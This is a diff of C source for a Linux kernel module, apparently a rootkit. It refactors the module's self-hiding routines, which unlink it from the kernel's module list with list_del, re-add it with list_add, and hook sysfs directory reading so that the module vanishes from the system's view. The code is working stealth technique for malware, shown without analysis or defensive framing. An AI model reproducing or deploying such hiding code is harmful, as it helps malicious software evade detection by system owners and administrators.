@@ -1,26 +1,16 @@
 #include <linux/module.h>    /* Needed by all modules */
 #include <linux/kernel.h>    /* Needed for KERN_INFO */
 #include <linux/fs.h>
-//#include <linux/sched.h>
-//#include <linux/list.h>
-
-#include "hide_module.h"
 
 #include "sysmap.h"          /* Pointers to system functions */
 #include "global.h"
-#include "hook_read.h"
+#include "hide_module.h"
 
 
 /// sysfs stuff
 typedef int (*fun_int_file_dirent_filldir_t)(struct file *, void*, filldir_t);
 fun_int_file_dirent_filldir_t original_sysfs_readdir;
 filldir_t original_sysfs_filldir;
-
-struct list_head tos;
-
-// for convenience, I'm using the following notations for fun pointers:
-// fun_<return type>_<arg1>_<arg2>_<arg3>_...
-typedef int (*fun_int_void)(void);
 
 int hidden = 0;
 
@@ -62,14 +52,10 @@ void unhook_sysfs(void){
  */
 void hide_module(void)
 {
-    struct list_head *prev;
-    struct list_head *next;
     if(hidden == 1)
         return;
-    prev = THIS_MODULE->list.prev;
-    next = THIS_MODULE->list.next;
-    prev->next = next;
-    next->prev = prev;
+    list_del(&(THIS_MODULE->list));
+
     hidden = 1;
     hook_sysfs();
 }
@@ -78,20 +64,10 @@ void hide_module(void)
 void unhide_module(void)
 {
     struct list_head *mods;
-    struct list_head *this_list_head;
     if(hidden == 0)
         return;
 
-    mods = (struct list_head *) ptr_modules;
-    this_list_head = &THIS_MODULE->list;
-
-
-    //insert this module into the list of modules (to the front)
-    mods->next->prev = this_list_head; // let prev of the (former) first module point to us
-    this_list_head->next = mods->next; // let our next pointer point to the former first module
-
-    mods->next = this_list_head; // let the modules list next pointer point to us
-    this_list_head->prev = mods; // let out prev pointer point to the modules list
+    list_add(&(THIS_MODULE->list), (struct list_head *) ptr_modules);
 
     hidden = 0;
     unhook_sysfs();
